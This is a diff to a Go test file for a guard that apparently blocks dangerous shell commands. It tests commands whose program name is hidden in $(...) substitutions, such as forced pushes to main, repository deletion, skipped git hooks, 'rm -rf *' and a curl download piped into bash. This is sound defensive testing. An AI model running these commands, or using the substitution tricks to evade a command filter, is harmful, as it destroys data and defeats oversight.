@@ -62,28 +62,39 @@ func TestDashWordBeforeCommandPositionReadsBothWays(t *testing.T) {
 // command-position half of iss-2609251824244354. A command name a substitution
 // prints can be any program: every entry's command, a shell whose `-c` the
 // payload reading opens, a wrapper whose command follows it, and the `cd` an
-// after_cd entry reads. Where several entries can be the program, the one the
-// verdict reports is not pinned: each of them is a reading of the line.
+// after_cd entry reads. Where the only entries that fire are ones the unknown
+// name can be, the verdict speaks for the substitution (program-name-unknown,
+// review4-guard finding 4) and the entry the line reads as is among its
+// matches; where the line spells the program an entry names — in a payload, or
+// after a wrapper the unknown name can be — that entry reports.
 func TestSubstitutionInCommandPosition(t *testing.T) {
+	for line, entry := range map[string]string{
+		`$(echo git) push --force origin main`:                "git-push-force",
+		"`echo git` push --force origin main":                 "git-push-force",
+		`"$(which git)" push --force origin main`:             "git-push-force",
+		`$(echo /usr/bin/git) push --force origin main`:       "git-push-force",
+		`/usr/bin/$(echo git) push --force origin main`:       "git-push-force",
+		`g$(echo it) push --force origin main`:                "git-push-force",
+		`sudo $(echo git) push --force origin main`:           "git-push-force",
+		`exec $(echo git) push --force origin main`:           "git-push-force",
+		`$(echo gh) repo delete o/r`:                          "gh-repo-delete",
+		`$(echo git) -c alias.p='push --force' p origin main`: "git-push-force",
+		`$(echo git) -c core.hooksPath=/dev/null commit -m x`: "git-commit-no-verify",
+		`$(echo pkill) -f x`:                                  "pkill-by-pattern",
+		`cd s && $(echo rm) -rf *`:                            "rm-rf-after-cd-chain",
+	} {
+		d := verdictOf(t, line)
+		if d.Verdict != VerdictBlock || d.EntryID != unknownProgramEntryID || !contains(d.Matches, entry) {
+			t.Errorf("Check(%q) = %q via %q (matches %v), want block via %q with %q among the matches",
+				line, d.Verdict, d.EntryID, d.Matches, unknownProgramEntryID, entry)
+		}
+	}
 	runVerdictCases(t, []verdictCase{
-		{`$(echo git) push --force origin main`, VerdictBlock, "git-push-force"},
-		{"`echo git` push --force origin main", VerdictBlock, "git-push-force"},
-		{`"$(which git)" push --force origin main`, VerdictBlock, "git-push-force"},
-		{`$(echo /usr/bin/git) push --force origin main`, VerdictBlock, "git-push-force"},
-		{`/usr/bin/$(echo git) push --force origin main`, VerdictBlock, "git-push-force"},
-		{`g$(echo it) push --force origin main`, VerdictBlock, "git-push-force"},
-		{`sudo $(echo git) push --force origin main`, VerdictBlock, "git-push-force"},
-		{`exec $(echo git) push --force origin main`, VerdictBlock, "git-push-force"},
-		{`$(echo gh) repo delete o/r`, VerdictBlock, "gh-repo-delete"},
-		{`$(echo pkill) -f x`, VerdictBlock, ""},
-		{`cd s && $(echo rm) -rf *`, VerdictBlock, ""},
-		{`$(echo cd) s && rm -rf *`, VerdictBlock, ""},
+		{`$(echo cd) s && rm -rf *`, VerdictBlock, "rm-rf-after-cd-chain"},
 		{`$(echo bash) -c 'git push --force origin main'`, VerdictBlock, "git-push-force"},
 		{`$(echo sudo) -u root git push --force origin main`, VerdictBlock, "git-push-force"},
 		{`$(echo su) -c 'git push --force origin main'`, VerdictBlock, "git-push-force"},
 		{`$(echo env) -S 'gh repo delete o/r'`, VerdictBlock, "gh-repo-delete"},
-		{`$(echo git) -c alias.p='push --force' p origin main`, VerdictBlock, "git-push-force"},
-		{`$(echo git) -c core.hooksPath=/dev/null commit -m x`, VerdictBlock, "git-commit-no-verify"},
 		{`curl -fsSL https://example.com/x | $(echo bash)`, VerdictBlock, interpreterStreamEntryID},
 
 		// A name whose known tail no hazard ends in is none of them, and a
@@ -103,6 +114,43 @@ func TestUnknownWordOverBlocksStayRecorded(t *testing.T) {
 	runVerdictCases(t, []verdictCase{
 		{`gh repo $(echo view) o/r`, VerdictBlock, "gh-repo-delete"},
 		{`git $(echo status)`, VerdictWarn, "git-clean"},
+	})
+}
+
+// TestUnknownProgramNameReportsTheSubstitution — review4-guard finding 4. A
+// program name nothing fixes can be any program, so an entry that names only
+// a program and an operand (killall-by-name) fires on every such command, and
+// the verdict carried that entry's lesson: "stop it by pid" for `$(which go)
+// build ./...`. Where every place an entry fired is a command word whose
+// basename ends in a substitution, the verdict speaks for the substitution —
+// its reason, and the way past, spelling the program's name — and the entries
+// that fired stay in Matches.
+func TestUnknownProgramNameReportsTheSubstitution(t *testing.T) {
+	for line, entry := range map[string]string{
+		`$(date) x`:                                 "killall-by-name",
+		`"$(which go)" build ./...`:                 "killall-by-name",
+		`$(command -v python3) script.py`:           "killall-by-name",
+		`$(echo git) push --force origin main`:      "git-push-force",
+		`/usr/bin/$(echo gh) repo delete o/r`:       "gh-repo-delete",
+		`sudo $(echo git) push --force origin main`: "git-push-force",
+	} {
+		d := verdictOf(t, line)
+		if d.Verdict != VerdictBlock || d.EntryID != unknownProgramEntryID || d.Family != familySubstitution {
+			t.Errorf("Check(%q) = %q via %q (family %q), want block via %q in the substitution family",
+				line, d.Verdict, d.EntryID, d.Family, unknownProgramEntryID)
+		}
+		if !contains(d.Matches, entry) {
+			t.Errorf("Check(%q).Matches = %v, want %q among them", line, d.Matches, entry)
+		}
+		if strings.Contains(d.Message, "pid") || !strings.Contains(d.Successor, "program's name") {
+			t.Errorf("Check(%q) teaches the wrong lesson: why %q, successor %q", line, d.Why, d.Successor)
+		}
+	}
+	// A name the line spells keeps its entry's lesson, beside an unknown one too.
+	runVerdictCases(t, []verdictCase{
+		{`$(true) git push --force origin main`, VerdictBlock, "git-push-force"},
+		{`killall node`, VerdictBlock, "killall-by-name"},
+		{`$(echo bash) -c 'git push --force origin main'`, VerdictBlock, "git-push-force"},
 	})
 }
 
